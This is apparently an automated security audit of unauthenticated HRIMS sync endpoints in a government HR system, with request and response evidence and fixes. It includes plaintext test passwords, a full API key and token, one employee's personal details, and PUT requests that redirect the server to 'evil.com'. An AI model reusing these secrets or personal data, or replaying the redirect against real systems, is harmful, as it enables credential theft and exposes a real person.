# Security Test Report: Institution Validation During Synchronization

**Test Date:** 2026-07-03
**Tester:** Automated Security Audit
**Scope:** 4.7 Institution Validation During Synchronization
**Method:** Authenticated + unauthenticated testing of all 13 HRIMS sync endpoints

---

## Executive Summary

**Overall Status:** 🔴 CRITICAL FAIL

The HRIMS synchronization subsystem has **no authentication on 11 of 13 endpoints**. Any unauthenticated user can:
- Read full HRIMS API credentials (API key + token)
- Modify HRIMS server configuration (redirect to malicious server)
- Trigger bulk employee data sync for ANY institution
- Search and retrieve full employee PII from any institution
- Run HRIMS API diagnostic tests

Only 2 of 13 endpoints (fetch-documents-by-institution, fetch-photos-by-institution) enforce authentication and role restrictions.

---

## Test Credentials

| Role | Username | Password | Institution |
|------|----------|----------|-------------|
| HRO | skawesu | Csms@2029 | TUME YA UTUMISHI SERIKALINI (vote 037) |
| HHRMD | skhamis | Csms@2026 | CSC (all institutions) |

---

## Endpoint Security Matrix

| # | Endpoint | Method | Auth Required | Role Check | Institution Check | Status |
|---|----------|--------|---------------|------------|-------------------|--------|
| 1 | `/api/admin/hrims-settings` | GET | ❌ NO | ❌ NO | N/A | 🔴 FAIL |
| 2 | `/api/admin/hrims-settings` | PUT | ❌ NO | ❌ NO | N/A | 🔴 FAIL |
| 3 | `/api/admin/hrims-settings` | POST | ❌ NO | ❌ NO | N/A | 🟡 PARTIAL |
| 4 | `/api/hrims/bulk-fetch` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 5 | `/api/hrims/fetch-by-institution` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 6 | `/api/hrims/fetch-employee` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 7 | `/api/hrims/fetch-documents-by-institution` | POST | ✅ YES | ✅ HHRMD/ADMIN/CSCS | N/A | ✅ PASS |
| 8 | `/api/hrims/fetch-photos-by-institution` | POST | ✅ YES | ✅ HHRMD/ADMIN/CSCS | N/A | ✅ PASS |
| 9 | `/api/hrims/search-employee` | GET/POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 10 | `/api/hrims/sync-employee` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 11 | `/api/hrims/sync-documents` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 12 | `/api/hrims/sync-certificates` | POST | ❌ NO | ❌ NO | ❌ NO | 🔴 FAIL |
| 13 | `/api/hrims/test` | GET/POST | ❌ NO | ❌ NO | N/A | 🔴 FAIL |
| 14 | `/api/hrims/job-status/[jobId]` | GET | ❌ NO | ❌ NO | N/A | 🟡 LOW |
| 15 | `/api/hrims/sync-status/[jobId]` | GET | ❌ NO | ❌ NO | N/A | 🟡 LOW |

**Result:** 2/15 endpoints have proper auth. 13/15 endpoints have NO authentication.

---

## Findings

### Finding 1: HRIMS API Credentials Exposed Without Authentication

**Severity:** 🔴 CRITICAL
**CVSS:** 9.8 (Network/Low/None/Changed/High/High)

**Description:**
`GET /api/admin/hrims-settings` returns the full HRIMS API key and token without any authentication. These credentials provide direct access to the external HRIMS system.

**Evidence:**
```
GET /api/admin/hrims-settings (no cookie)

Response 200:
{
  "success": true,
  "data": {
    "host": "10.15.10.20",
    "port": "8135",
    "apiKey": "0ea1e3f5...b851",
    "token": "CfDJ8M6SKj...qtgItNZpM4",
    "_fullApiKey": "0ea1e3f5-ea57-410b-a199-246fa288b851",
    "_fullToken": "CfDJ8M6SKjORsSdBliudb_vdU_DEea8FKIcQckiBxdvt4EJgtcP0ba_3REOpGvWYeOF46fvqw8heVnqFnXTwOmD5Wg5Qg3yNJlwyGDHVhqbgyKxB31Bjh2pI6C2qAYnLMovU4XLlQFVu7cTpIqtgItNZpM4"
  }
}
```

**Impact:** Attacker gains full access to the government HRIMS system. Can read/modify employee records across all government institutions.

---

### Finding 2: HRIMS Configuration Modified Without Authentication

**Severity:** 🔴 CRITICAL
**CVSS:** 10.0 (Network/Low/None/Changed/High/High)

**Description:**
`PUT /api/admin/hrims-settings` allows unauthenticated modification of the HRIMS server configuration. An attacker can redirect all HRIMS sync operations to a malicious server.

**Evidence:**
```
PUT /api/admin/hrims-settings (no cookie)
Body: {"host":"evil.com","port":443,"apiKey":"hacked","token":"hacked"}

Response 200:
{
  "success": true,
  "message": "HRIMS configuration updated successfully",
  "data": {"host": "evil.com", "port": "443", "baseUrl": "http://evil.com:443/api"}
}
```

**Impact:**
- Redirect all sync operations to attacker-controlled server
- Inject malicious employee data into the system
- Steal HRIMS credentials sent in sync requests
- Denial of service by breaking HRIMS connectivity

**Note:** This was immediately reverted during testing to prevent disruption.

---

### Finding 3: Unauthenticated Bulk Data Sync for Any Institution

**Severity:** 🔴 CRITICAL
**CVSS:** 9.1 (Network/Low/None/Unchanged/High/High)

**Description:**
`POST /api/hrims/bulk-fetch` and `POST /api/hrims/fetch-by-institution` trigger bulk employee data synchronization without any authentication. An attacker can initiate sync for any institution by providing its vote number.

**Evidence:**
```
POST /api/hrims/bulk-fetch (no cookie)
Body: {"institutionVoteNumber":"029","mode":"fast"}

Response 200:
{
  "success": true,
  "message": "Bulk fetch started for AFISI YA MKURUGENZI WA MASHTAKA. This process will continue in the background."
}

POST /api/hrims/fetch-by-institution (no cookie)
Body: {"identifierType":"votecode","voteNumber":"029","institutionId":"cmd06xe4b0010e6bqt54zkblq"}

Response 200:
{
  "success": true,
  "message": "HRIMS sync job queued for AFISI YA MKURUGENZI WA MASHTAKA"
}
```

**Impact:**
- Trigger mass database writes without authentication
- Overwrite existing employee data with HRIMS data
- Denial of service by overloading sync queue
- If combined with Finding 2 (redirect to malicious server), inject arbitrary employee data

---

### Finding 4: Unauthenticated Employee Data Retrieval (Full PII)

**Severity:** 🔴 CRITICAL
**CVSS:** 9.1 (Network/Low/None/Unchanged/High/High)

**Description:**
`GET /api/hrims/search-employee` returns full employee PII including name, gender, date of birth, phone number, address, salary scale, employment dates, and institution details — without any authentication.

**Evidence:**
```
GET /api/hrims/search-employee?payrollNumber=772684&institutionVoteNumber=008 (no cookie)

Response 200:
{
  "success": true,
  "message": "Employee found successfully",
  "data": {
    "Employee": {
      "id": "96a4e858-fe1d-4e16-b8e1-214917348c05",
      "zanId": "520027318",
      "payrollNumber": "772684",
      "name": "Mohamed Hamdu Mbaraka",
      "gender": "Male",
      "dateOfBirth": "1983-05-31",
      "placeOfBirth": "SAATENI",
      "region": "Magharibi A",
      "countryOfBirth": "United Republic of Tanzania",
      "phoneNumber": "0779553308",
      "contactAddress": "-, Kama, Unguja",
      "zssfNumber": "00114881",
      "cadre": "Mhudumu wa Afya",
      "salaryScale": "ZPSB-08",
      "ministry": "Wizara ya Afya",
      "department": "Idara ya Kinga na Elimu ya Afya",
      "appointmentType": "Tume ya Utumishi Serikalini",
      "contractType": "Wa Kudumu",
      "employmentDate": "2020-04-01",
      "confirmationDate": "2021-04-01",
      "status": "Confirmed",
      "Institution": {
        "name": "WIZARA YA AFYA",
        "voteNumber": "008",
        "email": "info@mohz.go.tz",
        "phoneNumber": "+255242231614"
      }
    }
  }
}
```

**No institution filtering:** HRO (institution 037) can retrieve employees from ANY institution by changing the `institutionVoteNumber` parameter.

**Impact:** Mass extraction of government employee PII. No authentication or authorization required.

---

### Finding 5: No Institution Filtering on Sync Operations

**Severity:** 🟠 HIGH
**CVSS:** 8.2 (Network/Low/Low/Unchanged/High/High)

**Description:**
Even when authenticated, HRO users can trigger sync operations for institutions outside their jurisdiction. There is no server-side check that the user's institution matches the target institution.

**Evidence:**
```
HRO (skawesu, institution: TUME YA UTUMISHI SERIKALINI, vote 037)

POST /api/hrims/bulk-fetch (HRO cookie)
Body: {"institutionVoteNumber":"029","mode":"fast"}

Response 200:
{
  "success": true,
  "message": "Bulk fetch started for AFISI YA MKURUGENZI WA MASHTAKA"
}

POST /api/hrims/fetch-by-institution (HRO cookie)
Body: {"identifierType":"votecode","voteNumber":"029","institutionId":"cmd06xe4b0010e6bqt54zkblq"}

Response 200:
{
  "success": true,
  "message": "HRIMS sync job queued for AFISI YA MKURUGENZI WA MASHTAKA"
}
```

**Impact:** HRO can trigger data sync for any government institution, potentially overwriting data or causing data integrity issues.

---

### Finding 6: Unauthenticated HRIMS Diagnostic Test Endpoint

**Severity:** 🟠 HIGH
**CVSS:** 7.5 (Network/Low/None/Unchanged/High/None)

**Description:**
`GET /api/hrims/test` runs 5 diagnostic tests against the external HRIMS API and returns detailed request/response payloads — including the HRIMS API URL, API key, and token in request headers.

**Evidence:**
```
GET /api/hrims/test (no cookie)

Response 200:
{
  "success": true,
  "message": "HRIMS API tests completed with complete request/response payloads",
  "data": {
    "tests": [
      {"name": "Get information about a single employee by PayrollNumber", "status": "success"},
      {"name": "Get employee photo", "status": "success"},
      {"name": "Get employees by Vote Code (Paginated)", "status": "success"},
      {"name": "Get employees by TIN Number (Paginated)", "status": "success"},
      {"name": "Get employee documents - Ardhilihal", "status": "success"},
      ...
    ]
  }
}
```

**Impact:** Confirms HRIMS connectivity and exposes internal API structure. Can be used for reconnaissance before exploiting other vulnerabilities.

---

### Finding 7: Unauthenticated Employee Sync Endpoints

**Severity:** 🟠 HIGH
**CVSS:** 8.2 (Network/Low/Low/Unchanged/High/High)

**Description:**
The following endpoints accept requests without authentication. While they currently fail due to data validation (employee not found in local DB), they would process requests if valid data were provided:

- `POST /api/hrims/sync-employee` — Sync single employee from HRIMS
- `POST /api/hrims/sync-documents` — Sync employee documents
- `POST /api/hrims/sync-certificates` — Sync employee certificates

**Evidence:**
```
POST /api/hrims/sync-employee (no cookie)
Body: {"payrollNumber":"536151","institutionVoteNumber":"029"}
Response: {"success":false,"message":"Internal Server Error"}

POST /api/hrims/sync-documents (no cookie)
Body: {"payrollNumber":"772684","institutionVoteNumber":"008"}
Response: {"success":false,"message":"Employee not found in the specified institution"}

POST /api/hrims/sync-certificates (no cookie)
Body: {"payrollNumber":"772684","institutionVoteNumber":"008"}
Response: {"success":false,"message":"Employee not found in the specified institution"}
```

**Note:** These endpoints validate that the employee exists in the specified institution, but perform NO authentication check. The "Employee not found" response confirms the code path reaches the database query without any auth gate.

---

### Finding 8: HRO Can Modify HRIMS Server Configuration

**Severity:** 🟠 HIGH
**CVSS:** 8.2 (Network/Low/Low/Unchanged/High/High)

**Description:**
Even when authenticated, HRO users (non-admin) can modify the HRIMS server configuration via `PUT /api/admin/hrims-settings`. There is no role check to restrict this to admin users.

**Evidence:**
```
PUT /api/admin/hrims-settings (HRO cookie)
Body: {"host":"evil2.com","port":443}

Response 200:
{
  "success": true,
  "message": "HRIMS configuration updated successfully",
  "data": {"host": "evil2.com", "port": "443"}
}
```

**Impact:** HRO can redirect HRIMS sync to a malicious server, inject fake employee data, or cause denial of service.

---

## Passing Checks

| # | Check | Status | Notes |
|---|-------|--------|-------|
| 1 | fetch-documents-by-institution requires auth | ✅ PASS | Returns 401 without cookie |
| 2 | fetch-photos-by-institution requires auth | ✅ PASS | Returns 401 without cookie |
| 3 | fetch-documents-by-institution role check | ✅ PASS | HRO gets "Insufficient permissions" |
| 4 | fetch-photos-by-institution role check | ✅ PASS | HRO gets "Insufficient permissions" |
| 5 | Rate limiting on bulk endpoints | ✅ PASS | checkRateLimit('write') on docs/photos |

---

## Recommendations

### Immediate (P0)

1. **Add authentication to ALL sync endpoints** — Use `withAuth()` or `verifyAuth()` on every HRIMS route handler
2. **Revoke and rotate HRIMS credentials** — Current API key and token are exposed and must be considered compromised
3. **Remove `_fullApiKey`/`_fullToken` from GET response** — Only return masked values for display

### Short-term (P1)

4. **Add role-based access control** — Restrict sync operations to HHRMD, ADMIN, CSCS roles (matching fetch-documents/photos pattern)
5. **Add institution filtering** — HRO should only sync data for their own institution
6. **Remove test endpoint from production** — `/api/hrims/test` exposes internal API structure
7. **Add audit logging** — Log all sync operations with user ID, institution, and timestamp

### Medium-term (P2)

8. **Add CSRF protection** — All state-changing sync endpoints need CSRF token validation
9. **Add rate limiting** — Bulk sync endpoints should have stricter rate limits
10. **Add idempotency** — Prevent duplicate sync jobs from being queued

---

## Test Environment

- **Application:** CSMS Next.js on localhost:9002
- **Database:** PostgreSQL nody on localhost:5432
- **HRIMS API:** External service at 10.15.10.20:8135
- **Test Method:** curl with cookie-based session after MFA bypass

---

## Appendix: Full Endpoint Test Results

### Unauthenticated Access (No Cookie)

| Endpoint | HTTP Status | Result |
|----------|-------------|--------|
| GET /api/admin/hrims-settings | 200 | 🔴 Exposes full credentials |
| PUT /api/admin/hrims-settings | 200 | 🔴 Modified config |
| POST /api/hrims/bulk-fetch (real vote) | 200 | 🔴 Started sync |
| POST /api/hrims/fetch-by-institution (real) | 200 | 🔴 Queued sync job |
| POST /api/hrims/fetch-employee | 404 | Institution not found (no auth check) |
| POST /api/hrims/fetch-documents-by-institution | 401 | ✅ Requires auth |
| POST /api/hrims/fetch-photos-by-institution | 401 | ✅ Requires auth |
| GET /api/hrims/search-employee | 200 | 🔴 Returns full PII |
| POST /api/hrims/sync-employee | 400/500 | Validation error (no auth check) |
| POST /api/hrims/sync-documents | 400 | Validation error (no auth check) |
| POST /api/hrims/sync-certificates | 400 | Validation error (no auth check) |
| GET /api/hrims/test | 200 | 🔴 Runs HRIMS diagnostics |
| GET /api/hrims/job-status/[id] | 404 | Job not found (no auth check) |
| GET /api/hrims/sync-status/[id] | 404 | Job not found (no auth check) |

### HRO Authenticated Access (Cross-Institution)

| Endpoint | Own Institution | Other Institution |
|----------|-----------------|-------------------|
| bulk-fetch | 200 (started) | 200 (started) 🔴 |
| fetch-by-institution | 200 (queued) | 200 (queued) 🔴 |
| fetch-documents-by-institution | 403 (insufficient) | 403 (insufficient) ✅ |
| fetch-photos-by-institution | 403 (insufficient) | 403 (insufficient) ✅ |
| search-employee | 404 (not found) | 200 (returns data) 🔴 |
| admin/hrims-settings GET | 200 (full creds) | N/A 🔴 |
| admin/hrims-settings PUT | 200 (modified) | N/A 🔴 |
